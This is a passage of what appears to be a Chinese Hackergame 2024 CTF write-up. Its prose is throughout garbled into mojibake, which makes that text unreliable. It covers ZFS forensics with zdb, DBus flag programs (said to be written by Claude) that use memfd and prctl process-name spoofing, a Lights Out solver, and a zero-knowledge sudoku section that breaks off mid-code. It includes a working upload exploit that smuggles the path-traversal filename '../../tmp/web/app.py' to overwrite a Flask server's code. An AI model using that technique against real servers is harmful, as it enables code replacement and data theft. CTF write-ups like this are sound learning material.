mtime\tSun May 29 03:49:29 1977 ctime\tWed Oct 23 21:37:22 2024 crtime\tWed Oct 23 21:37:22 2024 gen\t10 mode\t100644 size\t4135 parent\t34 links\t0 pflags\t840800000004 Object lvl iblk dblk dsize dnsize lsize %full type 3 1 128K 512 512 512 512 100.00 ZFS plain file 176 bonus System attributes dnode flags: USED_BYTES USERUSED_ACCOUNTED USEROBJUSED_ACCOUNTED dnode maxblkid: 0 uid 0 gid 0 atime\tMon Nov 10 04:49:03 2036 mtime\tSat Jan 12 01:18:00 2013 ctime\tWed Oct 23 21:37:22 2024 crtime\tWed Oct 23 21:37:22 2024 gen\t11 mode\t100755 size\t331 parent\t34 links\t0 pflags\t840800000104 æˆ‘ä»¬è¯•ä¸€ä¸‹ä»–ä»¬ä¸¤çš„atimeå’Œmtimeï¼Œç»“æœå‘ç°å°±æ˜¯å¯¹çš„flag2ã€‚flag_keyæ˜¯hg2024_1141919810.233696969_2109876543.1357924680_zfsï¼ˆç¬¬ä¸€ä¸ªæ–‡ä»¶çš„atimeä¼¼ä¹æœ‰äº›æ¶è¶£å‘³ï¼‰\nflag{snapshot_6db0f20dd59a448d314cb9cabe8daea9}\nP.S ç¬”è€…ä¸€å¼€å§‹å°±åªåœ¨çœ‹zdbçš„ç»“æœï¼Œç»“æœå…ˆæŠŠç¬¬äºŒé“é¢˜åšå‡ºæ¥äº†ï¼ˆå¯èƒ½æ˜¯å› ä¸ºflag1è¢«gzipå‹ç¼©äº†ï¼Œæ˜æ–‡é‡Œçœ‹ä¸å‡ºæ¥ï¼Œä½†ç”Ÿæˆflag2çš„è„šæœ¬æ²¡æœ‰è¢«å‹ç¼©ï¼‰ï¼Œéšåå°è¯•äº†é€šè¿‡ç±»ä¼¼zdb -dddddd -N hg2024 2æ‰¾å‡ºæ•°æ®ä½ç½®ï¼Œç„¶åç”¨zdb -R hg2024 0:20e00:a00:dvç­‰å‘½ä»¤å°è¯•å»è§£ç æ•°æ®ï¼Œä½†éƒ½ä¸€ç›´éƒ½æ— æ³•æ­£ç¡®æ¢å¤æ•°æ®ï¼ˆä¼°è®¡æ˜¯å› ä¸ºä¸æ¸…æ¥šå‹ç¼©æ–‡ä»¶å¤´çš„ä½ç½®ï¼Œæ‰€ä»¥zdb -Ræ— æ³•ç¡®è®¤å‹ç¼©çš„æ ¼å¼ï¼‰ã€‚\nzdb -ddddddddd -N hg2024 2 Dataset mos [META], ID 0, cr_txg 4, 94.5K, 56 objects, rootbp DVA[0]=\u003c0:b200:200\u003e DVA[1]=\u003c0:100b200:200\u003e DVA[2]=\u003c0:200c000:200\u003e [L0 DMU objset] fletcher4 lz4 unencrypted LE contiguous unique triple size=1000L/200P birth=33L/33P fill=56 cksum=00000008eabfc621:000003ab22c39a45:0000c4a29aa8ceb5:001bf0cf206542e2 Object lvl iblk dblk dsize dnsize lsize %full type 2 1 16K 128K 3K 512 128K 100.00 SPA space map (K=inherit) (Z=inherit=on) 320 bonus SPA space map header dnode flags: USED_BYTES dnode maxblkid: 0 Indirect blocks: 0 L0 0:1c00:400 0:1001c00:400 0:2003400:400 20000L/400P F=1 B=29/29 cksum=000000892a449fd1:00003e8c652d74ab:00106e148054423c:0339284d35914fc7 segment [0000000000000000, 0000000000020000) size 128K å‚è€ƒ https://serverfault.com/questions/378567/zfs-is-there-a-way-to-find-out-where-the-blocks-for-a-file-are-stored#1143030 https://openzfs.github.io/openzfs-docs/man/master/8/zdb.8.html#R https://github.com/openzfs/zfs/discussions/13326#discussioncomment-2695088 ç¦æ­¢å†…å· è¿™é“é¢˜çš„å…³é”®æ˜¯æœåŠ¡å™¨çš„åç«¯ä½¿ç”¨äº†flask run --reload --host 0å‘½ä»¤è¿è¡Œï¼Œå¹¶å¼€å¯äº†--reloadé€‰é¡¹ï¼Œé‚£å¦‚æœæœ‰æ–‡ä»¶æ¢æ‰äº†app.pyé‚£flaskä¼šé©¬ä¸Šåº”ç”¨æ–°çš„è„šæœ¬ã€‚è§‚å¯Ÿè¯„æµ‹çš„è„šæœ¬ï¼Œå‘ç°è„šæœ¬ç›´æ¥æŠŠæäº¤çš„æ–‡ä»¶å­˜åˆ°äº†/tmp/uploads\"é‡Œï¼š\nfile = request.files['file'] filename = file.filename filepath = os.path.join(UPLOAD_DIR, filename) file.save(filepath) è§£å†³æ–¹æ¡ˆå°±æ˜¯æŠŠä¸Šä¼ çš„æ–‡ä»¶åæ”¹æˆè½¯é“¾æ¥ï¼Œè¿™æ ·ä¸Šä¼ çš„æ–‡ä»¶ä¼šç›´æ¥è¦†ç›–æ‰/tmp/web/app.pyï¼Œä¸Šä¼ çš„æ–‡ä»¶å°±éšæ„äº›å†™ä¸€ä¸ªè¯»å–å¹¶è¿”å›answer.jsonçš„routeå³å¯ã€‚\nimport os import requests import json def create_and_upload_file(): # # 1. åˆ›å»ºä¸€ä¸ªçœ‹ä¼¼æ­£å¸¸çš„JSONæ–‡ä»¶ # payload = [0] * 50000 # åˆ›å»º50000ä¸ª0çš„æ•°ç»„ # filename = \"payload.json\" # # å°†payloadå†™å…¥æ–‡ä»¶ # with open(filename, 'w') as f: # json.dump(payload, f) filename = \"exp_ans.py\" # 2. ä¸Šä¼ æ–‡ä»¶ url = \"https://chal02-selrm3q9.hack-challenge.lug.ustc.edu.cn:8443/submit\" # è®¾ç½®ç‰¹æ®Šçš„æ–‡ä»¶åï¼Œå°è¯•åˆ›å»ºè½¯é“¾æ¥ files = { 'file': ('../../tmp/web/app.py', open(filename, 'rb'), 'application/json') } # å‘é€è¯·æ±‚ response = requests.post(url, files=files) print(f\"Status Code: {response.status_code}\") print(f\"Response: {response.text}\") # # 3. æ¸…ç†ä¸´æ—¶æ–‡ä»¶ # os.remove(filename) if __name__ == \"__main__\": create_and_upload_file() exp_ans.py:\nfrom flask import Flask, jsonify import json app = Flask(__name__) @app.route('/', methods=['GET']) def index(): try: with open('answers.json', 'r') as f: answers = json.load(f) return jsonify({\"answers\": answers}) except Exception as e: return jsonify({\"error\": str(e)}) if __name__ == '__main__': app.run() è§£ç æ•°æ®ï¼š\ndef decode_flag(numbers): # å°†æ¯ä¸ªæ•°å­—åŠ 65ç„¶åè½¬æ¢ä¸ºASCIIå­—ç¬¦ flag = '' for num in numbers: char = chr(num + 65) flag += char return flag # ä»å“åº”ä¸­è·å–çš„æ•°å­— numbers = [37,43,32,38,58,52,45,46,-32,-32,-32,-32,30,36,50,49,36,53,36,49,30,45,46,54,30,20,30,49,52,45,30,12,24,30,34,-17,35,36,35,34,37,-8,33,32,-9,37,-15,37,60,11,25,73,78,25,46,78,45,68,55,60,96,44,13,53,62,80,14,88,70,33,8,33,41,94,35,8,99,51,90,49,14,38,3,13,40,91,57,28,99,51,27,42,41,56,71,85,45,1,39,42,92,2,25,62,6,13,35,64,71,13,98,66,30,90,12,73,70,56,92,71,43,81,75,84,9,10,61,10,9,16,47,32,60,76,73,66,76,93,44,38,38,25,8,38,31,17,15,19,65,33,32,14,66,21,46,30,62,18,19,74,14,77,62,66,40,44,80,71,53,39,22,100,90,71,79,17,65,32,70,43,83,45,63,40,53,68,6,89,36,45,27,28,68,53,30,56,54,96,35,61,44,90,11,63,29,87,60,22,50,97,98,2,70,10,0,82,50,64,12,87,8,50,69,44,58,1,96,20,93,92,83,14,67,44,19,49,86,82,54,65,67,68,24,39,75,18,97,22,49,69,24,36,71,13,9,12,69,11,55,2,89,7,30,43,80,92,28,3,78,1,11,6,6,72,94,17,92,57,26,10,14,91,44,9,18,22,81,42,28,8,73,28,66,80,41,15,77,77,90,84,8,1,66,99,39,27,3,83,36,8,1,11,23,64,90,69,64,94,15,6,29,1,52,45,89,88,80,95,44,33,34,5,17,65,15,63,11,54,71,83,49,71,100,74,97,45,56,79,28,31,94,77,92,29,46,70,87,8,69,64,42,42,52,96,84,43,82,11,45,16,77,3,1,15,19,74,34,100,4,95,25,17,20,29,57,62,12,47,96,46,17,69,9,47,4,57,39,65,39,30,12,17,22,44,24,59,84,35,73,66,56,92,61,73,77,10,78,85,66,13,14,28,41,80,68,7,44,34,20,23,67,81,91,62,25,67,67,78,72,29,42,10,15,68,95,55,57,63,49,82,44,8,62,90,4,49,87,5,57,23,88,39,25,56,7,55,74,99,74,48,83,29,84,65,29,15,10,76,4,79,56,6,80,70,48,48,15,93,41,55,49,50,0,47,35,84,96,77,89,87] # è§£ç å¹¶æ‰“å°flag flag = decode_flag(numbers) print(f\"Flag: {flag}\") # Flag: flag{uno!!!!_esrever_now_U_run_MY_c0dedcf9ba8f2f}LZ... ä¸å¤ªåˆ†å¸ƒå¼çš„è½¯æ€»çº¿ å€¼å¾—ä¸€æçš„æ˜¯è¿™é“é¢˜æ˜¯å®Œå…¨ç”±LLMå†™çš„ï¼Œæ²¡æœ‰ä»»ä½•äººå·¥å¹²é¢„ï¼Œä¸”LLMå†™å‡ºæ¥çš„WPå´æ˜¯å®Œå…¨æ­£ç¡®çš„ã€‚\nLLMï¼ˆClaudeï¼‰å†™çš„ç­”æ¡ˆï¼Œæœªç»ä»»ä½•ä¿®æ”¹ What DBus Gonna Do? è®©æˆ‘åˆ†æä¸€ä¸‹è¿™é“CTFé¢˜ç›®ã€‚ä»ä»£ç ä¸­å¯ä»¥çœ‹å‡ºï¼Œè¿™æ˜¯ä¸€ä¸ªåŸºäºDBusçš„ç³»ç»ŸæœåŠ¡ï¼Œæä¾›äº†ä¸‰ä¸ªè·å–flagçš„æ–¹æ³•ã€‚æˆ‘ä»¬å…ˆå…³æ³¨ç¬¬ä¸€ä¸ªflagã€‚\nä»flagserver.cçš„ä»£ç ä¸­å¯ä»¥çœ‹åˆ°è·å–flag1çš„æ–¹æ³•æ˜¯GetFlag1ï¼Œå®ƒéœ€è¦ä¸€ä¸ªå­—ç¬¦ä¸²å‚æ•°ï¼Œä¸”è¯¥å‚æ•°å¿…é¡»ä¸¥æ ¼ç­‰äº\"Please give me flag1\"ã€‚\næˆ‘ä»¬å¯ä»¥ç¼–å†™ä¸€ä¸ªç®€å•çš„Cç¨‹åºæ¥è°ƒç”¨è¿™ä¸ªDBusæ–¹æ³•ï¼š\n#include #include #include #define DEST \"cn.edu.ustc.lug.hack.FlagService\" #define OBJECT_PATH \"/cn/edu/ustc/lug/hack/FlagService\" #define METHOD \"GetFlag1\" #define INTERFACE \"cn.edu.ustc.lug.hack.FlagService\" int main() { GError *error = NULL; GDBusConnection *connection; GVariant *result; // Connect to the system bus connection = g_bus_get_sync(G_BUS_TYPE_SYSTEM, NULL, \u0026error); if (!connection) { g_printerr(\"Failed to connect to the system bus: %s\\n\", error-\u003emessage); g_error_free(error); return EXIT_FAILURE; } // Call the D-Bus method with the required string result = g_dbus_connection_call_sync( connection, DEST, // destination OBJECT_PATH, // object path INTERFACE, // interface name METHOD, // method g_variant_new(\"(s)\", \"Please give me flag1\"), // parameters G_VARIANT_TYPE(\"(s)\"), // expected return type G_DBUS_CALL_FLAGS_NONE, -1, // timeout (use default) NULL, \u0026error ); if (result) { const gchar *response; g_variant_get(result, \"(\u0026s)\", \u0026response); g_print(\"%s\\n\", response); g_variant_unref(result); } else { g_printerr(\"Error calling D-Bus method: %s\\n\", error-\u003emessage); g_error_free(error); } g_object_unref(connection); return EXIT_SUCCESS; } ä½¿ç”¨æ–¹æ³•ï¼š\né¦–å…ˆå°†è¿™ä¸ªç¨‹åºç¼–è¯‘: gcc getflag1.c `pkg-config --cflags --libs gio-2.0` -o getflag1 ç„¶åå°†ç¼–è¯‘å¥½çš„ç¨‹åºè½¬æ¢æˆbase64: base64 getflag1 --wrap=0 å°†base64ç¼–ç åçš„å†…å®¹æäº¤ç»™æœåŠ¡å™¨ è¿™ä¸ªç¨‹åºä¼šï¼š\nè¿æ¥åˆ°DBusç³»ç»Ÿæ€»çº¿ è°ƒç”¨FlagServiceçš„GetFlag1æ–¹æ³• ä¼ å…¥æŒ‡å®šçš„å­—ç¬¦ä¸²\"Please give me flag1\" æ‰“å°è¿”å›çš„flagå†…å®¹ ç¨‹åºæ¨¡ä»¿äº†getflag3.cçš„ç»“æ„ï¼Œä½†åšäº†å¿…è¦çš„ä¿®æ”¹ä»¥é€‚åº”GetFlag1æ–¹æ³•çš„è¦æ±‚ã€‚ä¸»è¦çš„åŒºåˆ«æ˜¯ï¼š\næ·»åŠ äº†æ­£ç¡®çš„å‚æ•° \"Please give me flag1\" æŒ‡å®šäº†æ­£ç¡®çš„è¿”å›ç±»å‹ G_VARIANT_TYPE(\"(s)\") æ­£ç¡®å¤„ç†å¹¶æ‰“å°è¿”å›çš„å­—ç¬¦ä¸² è¿™åº”è¯¥èƒ½æˆåŠŸè·å–åˆ°ç¬¬ä¸€ä¸ªflagã€‚éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œé¢˜ç›®ä½¿ç”¨äº†Dockerç¯å¢ƒï¼Œæ‰€ä»¥æˆ‘ä»¬éœ€è¦æŒ‰ç…§æŒ‡å®šçš„æ–¹å¼æäº¤ç¨‹åºã€‚\nè¦ç»§ç»­è·å–flag2å’Œflag3å—ï¼Ÿ\nflag{every_11nuxdeskT0pU5er_uSeDBUS_bUtn0NeknOwh0w_c7afe80dbf} If I Could Be A File Descriptor å¥½çš„ï¼Œè®©æˆ‘ä»¬æ¥åˆ†æè·å–flag2çš„æ–¹æ³•ã€‚\nä»flagserver.cçš„ä»£ç ä¸­å¯ä»¥çœ‹åˆ°ï¼ŒGetFlag2æ–¹æ³•éœ€è¦ï¼š\nä¸€ä¸ªæ–‡ä»¶æè¿°ç¬¦(fd)ä½œä¸ºå‚æ•° ä»è¿™ä¸ªfdè¯»å–çš„å†…å®¹å¿…é¡»ä¸¥æ ¼ç­‰äº\"Please give me flag2\\n\" è¿™ä¸ªfdä¸èƒ½æŒ‡å‘æ–‡ä»¶ç³»ç»Ÿä¸Šçš„æ–‡ä»¶ï¼ˆé€šè¿‡æ£€æŸ¥/proc/self/fd/{fd}çš„ç¬¦å·é“¾æ¥å®ç°ï¼‰ ç”±äºä¸èƒ½ä½¿ç”¨æ™®é€šæ–‡ä»¶ï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨pipeæˆ–memfdæ¥å®ç°ã€‚æˆ‘é€‰æ‹©ä½¿ç”¨memfdï¼Œå› ä¸ºå®ƒæ›´ç°ä»£ä¸”æ›´é€‚åˆè¿™ç§åœºæ™¯ã€‚\n#define _GNU_SOURCE #include #include #include #include #include #include #include #define DEST \"cn.edu.ustc.lug.hack.FlagService\" #define OBJECT_PATH \"/cn/edu/ustc/lug/hack/FlagService\" #define METHOD \"GetFlag2\" #define INTERFACE \"cn.edu.ustc.lug.hack.FlagService\" int main() { GError *error = NULL; GDBusConnection *connection; GVariant *result; // Create memfd int memfd = memfd_create(\"flag2_request\", 0); if (memfd == -1) { perror(\"memfd_create failed\"); return EXIT_FAILURE; } // Write the required message const char *msg = \"Please give me flag2\\n\"; if (write(memfd, msg, strlen(msg)) != strlen(msg)) { perror(\"write failed\"); close(memfd); return EXIT_FAILURE; } // Reset file position to beginning if (lseek(memfd, 0, SEEK_SET) == -1) { perror(\"lseek failed\"); close(memfd); return EXIT_FAILURE; } // Connect to the system bus connection = g_bus_get_sync(G_BUS_TYPE_SYSTEM, NULL, \u0026error); if (!connection) { g_printerr(\"Failed to connect to the system bus: %s\\n\", error-\u003emessage); g_error_free(error); close(memfd); return EXIT_FAILURE; } // Create GUnixFDList and add our fd GUnixFDList *fd_list = g_unix_fd_list_new(); gint fd_index = g_unix_fd_list_append(fd_list, memfd, \u0026error); if (fd_index == -1) { g_printerr(\"Failed to append fd: %s\\n\", error-\u003emessage); g_error_free(error); g_object_unref(connection); close(memfd); return EXIT_FAILURE; } // Call the D-Bus method result = g_dbus_connection_call_with_unix_fd_list_sync( connection, DEST, // destination OBJECT_PATH, // object path INTERFACE, // interface name METHOD, // method g_variant_new(\"(h)\", fd_index), // parameters G_VARIANT_TYPE(\"(s)\"), // expected return type G_DBUS_CALL_FLAGS_NONE, -1, // timeout (use default) fd_list, // fd_list NULL, // out_fd_list NULL, \u0026error ); if (result) { const gchar *response; g_variant_get(result, \"(\u0026s)\", \u0026response); g_print(\"%s\\n\", response); g_variant_unref(result); } else { g_printerr(\"Error calling D-Bus method: %s\\n\", error-\u003emessage); g_error_free(error); } g_object_unref(fd_list); g_object_unref(connection); close(memfd); return EXIT_SUCCESS; } ä½¿ç”¨æ–¹æ³•ï¼š\nç¼–è¯‘ç¨‹åº: gcc getflag2.c `pkg-config --cflags --libs gio-2.0` -o getflag2 å°†ç¼–è¯‘å¥½çš„ç¨‹åºè½¬æ¢æˆbase64: base64 getflag2 --wrap=0 å°†base64ç¼–ç åçš„å†…å®¹æäº¤ç»™æœåŠ¡å™¨ è¿™ä¸ªç¨‹åºçš„å…³é”®ç‚¹æ˜¯ï¼š\nä½¿ç”¨memfd_createåˆ›å»ºä¸€ä¸ªå†…å­˜æ–‡ä»¶æè¿°ç¬¦ï¼Œè¿™æ ·åˆ›å»ºçš„fdä¸ä¼šæŒ‡å‘æ–‡ä»¶ç³»ç»Ÿä¸Šçš„ä»»ä½•æ–‡ä»¶ å‘memfdå†™å…¥æŒ‡å®šçš„å­—ç¬¦ä¸²\"Please give me flag2\\n\" å°†æ–‡ä»¶æŒ‡é’ˆé‡ç½®åˆ°å¼€å§‹ä½ç½®ï¼Œè¿™æ ·æœåŠ¡å™¨è¯»å–æ—¶èƒ½è¯»åˆ°å®Œæ•´å†…å®¹ ä½¿ç”¨g_unix_fd_list_newå’Œg_unix_fd_list_appendæ¥åˆ›å»ºå’Œæ·»åŠ æ–‡ä»¶æè¿°ç¬¦ ä½¿ç”¨g_dbus_connection_call_with_unix_fd_list_syncè€Œä¸æ˜¯æ™®é€šçš„call_syncï¼Œå› ä¸ºæˆ‘ä»¬éœ€è¦ä¼ é€’æ–‡ä»¶æè¿°ç¬¦ è¿™ä¸ªæ–¹æ¡ˆå¾ˆå·§å¦™åœ°ç»•è¿‡äº†æœåŠ¡å™¨çš„æ–‡ä»¶ç³»ç»Ÿæ£€æŸ¥ï¼Œå› ä¸ºmemfdåˆ›å»ºçš„æ˜¯å†…å­˜ä¸­çš„æ–‡ä»¶æè¿°ç¬¦ï¼Œä¸å­˜åœ¨äºå®é™…çš„æ–‡ä»¶ç³»ç»Ÿä¸­ï¼ŒåŒæ—¶åˆæ»¡è¶³äº†æœåŠ¡å™¨è¦æ±‚è¯»å–ç‰¹å®šå†…å®¹çš„æ¡ä»¶ã€‚\néœ€è¦è·å–flag3å—ï¼Ÿ\nflag{n5tw0rk_TrAnSpaR5Ncy_d0n0t_11k5_Fd_36a581e78b} Comm Say Maybe è®©æˆ‘åˆ†æä¸€ä¸‹è·å–flag3çš„è¦æ±‚ã€‚\nä»flagserver.cçš„ä»£ç ä¸­ï¼Œæˆ‘ä»¬å¯ä»¥çœ‹åˆ°GetFlag3æ–¹æ³•æœ‰ä¸€ä¸ªç‰¹æ®Šçš„è¦æ±‚ï¼šè°ƒç”¨ç¨‹åºçš„è¿›ç¨‹åï¼ˆåœ¨/proc/{pid}/commä¸­ï¼‰å¿…é¡»ä¸¥æ ¼ç­‰äº\"getflag3\\n\"ã€‚\nå®é™…ä¸Šï¼Œé¢˜ç›®å·²ç»æä¾›äº†getflag3.cï¼Œå¹¶ä¸”åœ¨Makefileä¸­ä¼šç¼–è¯‘å¹¶å®‰è£…åˆ°/usr/bin/getflag3ã€‚è¿™çœ‹èµ·æ¥æ˜¯æ­£ç¡®çš„å®ç°ï¼Œä½†æ˜¯ä»é¢˜ç›®server.pyä¸­å¯ä»¥çœ‹åˆ°ï¼š\nç¨‹åºä¼šä»¥nobodyç”¨æˆ·èº«ä»½è¿è¡Œ ç¨‹åºä¼šè¢«æ”¾åœ¨/dev/shm/executableè·¯å¾„ä¸‹ ç¨‹åºçš„åç§°ä¼šå˜æˆ\"executable\"è€Œä¸æ˜¯\"getflag3\" å› æ­¤ï¼Œæˆ‘ä»¬éœ€è¦ä¿®æ”¹ç¨‹åºæ¥ç¡®ä¿è¿›ç¨‹åæ˜¯\"getflag3\"ã€‚æˆ‘ä»¬å¯ä»¥ä½¿ç”¨prctlç³»ç»Ÿè°ƒç”¨æ¥ä¿®æ”¹è¿›ç¨‹åï¼š\n#define _GNU_SOURCE #include #include #include #include #include #include #define DEST \"cn.edu.ustc.lug.hack.FlagService\" #define OBJECT_PATH \"/cn/edu/ustc/lug/hack/FlagService\" #define METHOD \"GetFlag3\" #define INTERFACE \"cn.edu.ustc.lug.hack.FlagService\" int main() { // Set the process name to \"getflag3\" if (prctl(PR_SET_NAME, \"getflag3\", 0, 0, 0) != 0) { perror(\"prctl failed\"); return EXIT_FAILURE; } GError *error = NULL; GDBusConnection *connection; GVariant *result; connection = g_bus_get_sync(G_BUS_TYPE_SYSTEM, NULL, \u0026error); if (!connection) { g_printerr(\"Failed to connect to the system bus: %s\\n\", error-\u003emessage); g_error_free(error); return EXIT_FAILURE; } result = g_dbus_connection_call_sync( connection, DEST, // destination OBJECT_PATH, // object path INTERFACE, // interface name METHOD, // method NULL, // parameters G_VARIANT_TYPE(\"(s)\"), // expected return type G_DBUS_CALL_FLAGS_NONE, -1, // timeout (use default) NULL, \u0026error ); if (result) { const gchar *response; g_variant_get(result, \"(\u0026s)\", \u0026response); g_print(\"%s\\n\", response); g_variant_unref(result); } else { g_printerr(\"Error calling D-Bus method: %s\\n\", error-\u003emessage); g_error_free(error); } g_object_unref(connection); return EXIT_SUCCESS; } ä½¿ç”¨æ–¹æ³•ï¼š\nç¼–è¯‘ç¨‹åº: gcc getflag3-modified.c `pkg-config --cflags --libs gio-2.0` -o getflag3-modified å°†ç¼–è¯‘å¥½çš„ç¨‹åºè½¬æ¢æˆbase64: base64 getflag3-modified --wrap=0 å°†base64ç¼–ç åçš„å†…å®¹æäº¤ç»™æœåŠ¡å™¨ ä¸»è¦çš„æ”¹åŠ¨æ˜¯ï¼š\næ·»åŠ äº†prctlç³»ç»Ÿè°ƒç”¨æ¥è®¾ç½®è¿›ç¨‹åä¸º\"getflag3\" ä¿®æ”¹äº†è¿”å›ç±»å‹ä¸ºG_VARIANT_TYPE(\"(s\")ä»¥æ­£ç¡®å¤„ç†è¿”å›å€¼ æ·»åŠ äº†è¿”å›å€¼çš„æ‰“å° è¿™ä¸ªç¨‹åºåº”è¯¥èƒ½æˆåŠŸè·å–flag3ï¼Œå› ä¸ºï¼š\nä½¿ç”¨prctlè®¾ç½®çš„è¿›ç¨‹åä¼šåæ˜ åœ¨/proc/{pid}/commä¸­ å³ä½¿ç¨‹åºæ–‡ä»¶åæ˜¯executableï¼Œé€šè¿‡prctlè®¾ç½®çš„è¿›ç¨‹åä¾ç„¶ä¼šç”Ÿæ•ˆ ç¨‹åºåœ¨nobodyç”¨æˆ·ä¸‹è¿è¡Œä¹Ÿä¸ä¼šå½±å“prctlçš„åŠŸèƒ½ æ‰€æœ‰çš„flagsç°åœ¨éƒ½åº”è¯¥æ‹¿åˆ°äº†ï¼è¿™ä¸ªé¢˜ç›®å¾ˆå¥½åœ°å±•ç¤ºäº†DBusæœåŠ¡çš„å®‰å…¨æ£€æŸ¥æœºåˆ¶ï¼ŒåŒ…æ‹¬ï¼š\nflag1: ç®€å•çš„å­—ç¬¦ä¸²åŒ¹é… flag2: æ–‡ä»¶æè¿°ç¬¦å’Œå†…å®¹æ£€æŸ¥ flag3: è¿›ç¨‹åéªŒè¯ flag{prprprprprCTL_15your_FRiEND_9f3f4bbbc3} å…³ç¯ è¿™é“é¢˜ä¸»è¦æ˜¯æŠŠç¯çš„å­—ç¬¦ä¸²è½¬æ¢æˆçŸ©é˜µï¼Œç„¶åç”¨é«˜æ–¯æ¶ˆå…ƒæ³•è§£æ–¹ç¨‹ç»„ã€‚æœ€åä¸€é—®æ²¡æœ‰æƒ³åˆ°å¯ä»¥æå‰ä¿å­˜PLUåˆ†è§£çš„ç»“æœï¼Œå› æ­¤è‡ªè®¤ä¸ºè€—æ—¶å¤ªé•¿å°±æ”¾å¼ƒäº†ã€‚\nå°†3Dé—®é¢˜è½¬æ¢ä¸ºçº¿æ€§æ–¹ç¨‹ç»„ ä½¿ç”¨GF(2)ä¸Šçš„é«˜æ–¯æ¶ˆå…ƒæ³•æ±‚è§£ï¼ˆå› ä¸ºå¼€å…³çŠ¶æ€æ˜¯0/1çš„å¼‚æˆ–è¿ç®—ï¼‰ å°†è§£è½¬æ¢å›å¼€å…³åºåˆ— import numpy as np from typing import List, Tuple def create_coefficient_matrix(n: int) -\u003e np.ndarray: \"\"\"Create the coefficient matrix for the linear system.\"\"\" size = n * n * n matrix = np.zeros((size, size), dtype=np.uint8) for i in range(n): for j in range(n): for k in range(n): idx = i * n * n + j * n + k # The switch affects itself matrix[idx][idx] = 1 # Affect adjacent positions if i \u003e 0: # up matrix[idx - n*n][idx] = 1 if i \u003c n-1: # down matrix[idx + n*n][idx] = 1 if j \u003e 0: # left matrix[idx - n][idx] = 1 if j \u003c n-1: # right matrix[idx + n][idx] = 1 if k \u003e 0: # front matrix[idx - 1][idx] = 1 if k \u003c n-1: # back matrix[idx + 1][idx] = 1 return matrix def gauss_elimination_gf2(matrix: np.ndarray, vector: np.ndarray) -\u003e np.ndarray: \"\"\"Perform Gaussian elimination in GF(2).\"\"\" n = len(vector) augmented = np.column_stack((matrix, vector)) # Forward elimination for i in range(n): # Find pivot pivot_row = i while pivot_row \u003c n and augmented[pivot_row, i] == 0: pivot_row += 1 if pivot_row == n: continue # Swap rows if necessary if pivot_row != i: augmented[i], augmented[pivot_row] = augmented[pivot_row].copy(), augmented[i].copy() # Eliminate below for j in range(i + 1, n): if augmented[j, i] == 1: augmented[j] = (augmented[j] + augmented[i]) % 2 # Back substitution solution = np.zeros(n, dtype=np.uint8) for i in range(n-1, -1, -1): if augmented[i, i] == 0: if augmented[i, -1] == 1: raise ValueError(\"No solution exists\") continue solution[i] = augmented[i, -1] for j in range(i+1, n): solution[i] = (solution[i] + augmented[i, j] * solution[j]) % 2 return solution def solve_lights_out_3d(lights_string: str, n: int) -\u003e str: \"\"\"Solve the 3D Lights Out puzzle.\"\"\" # Convert lights string to array lights = np.array([int(x) for x in lights_string], dtype=np.uint8) # Create coefficient matrix coef_matrix = create_coefficient_matrix(n) # Solve using Gaussian elimination try: solution = gauss_elimination_gf2(coef_matrix, lights) return ''.join(map(str, solution)) except ValueError: return \"No solution exists\" # Example usage function def solve_puzzle(lights_string: str, n: int) -\u003e str: result = solve_lights_out_3d(lights_string, n) if result == \"No solution exists\": print(\"No solution exists for this puzzle\") return \"\" return result flagï¼š\nflag{bru7e_f0rce_1s_a1l_y0u_n3ed_1f50afa982} flag{prun1ng_1s_u5eful_690eea3cbb} flag{lin3ar_alg3bra_1s_p0werful_27dafeebb2} é›¶çŸ¥è¯†æ•°ç‹¬ æ•°ç‹¬é«˜æ‰‹ ç›´æ¥åšæ•°ç‹¬å°±å¯ä»¥å¾—åˆ°flag\nZKé«˜æ‰‹ åœ¨åšè¿™é“é¢˜ä¹‹å‰ï¼Œæˆ‘å¯¹é›¶çŸ¥è¯†è¯æ˜å®Œå…¨ä¸äº†è§£ï¼Œå› æ­¤å…ˆé—®äº†AIè¿™é“é¢˜æ˜¯ä»€ä¹ˆæ„æ€ï¼š\nè¿™æ˜¯ä¸€ä¸ªé›¶çŸ¥è¯†æ•°ç‹¬è¯æ˜ç³»ç»Ÿï¼Œå…¶ä¸­: æ•°ç‹¬è°œé¢˜(unsolved_grid)æ˜¯å…¬å¼€çš„ è§£ç­”(solved_grid)æ˜¯ç§å¯†çš„ éœ€è¦ç”Ÿæˆä¸€ä¸ªè¯æ˜æ¥è¯æ˜æˆ‘ä»¬çŸ¥é“æ­£ç¡®çš„è§£ç­” ä¸ºäº†è§£é¢˜ï¼Œæˆ‘ä»¬éœ€è¦: æ‰¾åˆ°ä¸€ä¸ªæœ‰æ•ˆçš„æ•°ç‹¬è°œé¢˜åŠå…¶è§£ç­” ä½¿ç”¨circomç”µè·¯ç”Ÿæˆè¯æ˜ ç¡®ä¿è¯æ˜å¯ä»¥é€šè¿‡verification_key.jsonçš„éªŒè¯ verification_key.jsonæ˜¾ç¤ºè¿™æ˜¯ä½¿ç”¨Groth16åè®®ï¼Œéœ€è¦81ä¸ªå…¬å¼€è¾“å…¥(å°±æ˜¯9x9çš„æ•°ç‹¬è°œé¢˜)ã€‚ å› æ­¤ï¼Œæˆ‘ä»¬éœ€è¦åšçš„æ˜¯ï¼š\næ„é€ ä¸€ä¸ªæœ‰æ•ˆçš„æ•°ç‹¬é¢˜ç›®å’Œè§£ç­” ä½¿ç”¨setup.shç”Ÿæˆæ‰€éœ€çš„è¯æ˜ç³»ç»Ÿç»„ä»¶ ç”Ÿæˆå¹¶éªŒè¯proof.json å…ˆå†™ä¸€ä¸ªæ•°ç‹¬è§£ç çš„è„šæœ¬ï¼š\nimport json def print_grid(grid): \"\"\"Pretty print the sudoku grid\"\"\" for i in range(9): if i % 3 == 0 and i != 0: print(\"- - - - - - - - - - - -\") for j in range(9): if j % 3 == 0 and j != 0: print(\"|\", end=\" \") if j == 8: print(grid[i][j]) else: print(str(grid[i][j]) + \" \", end=\"\") def convert_1d_to_2d(puzzle): \"\"\"Convert 1D array to 2D grid\"\"\" return [puzzle[i:i + 9] for i in range(0, 81, 9)] def is_safe(grid, row, col, num): \"\"\"Check if it's safe to place number\"\"\" # Check row for x in range(9): if grid[row][x] == num: return False # Check column for x in range(9): if grid[x][col] == num: return False # Check 3x3 box start_row, start_col = 3 * (row // 3), 3 * (col // 3) for i in range(3): for j in range(3): if grid[i + start_row][j + start_col] == num: return False return True def solve_sudoku(grid): \"\"\"Solve sudoku using backtracking\"\"\" empty = find_empty(grid) if not empty: 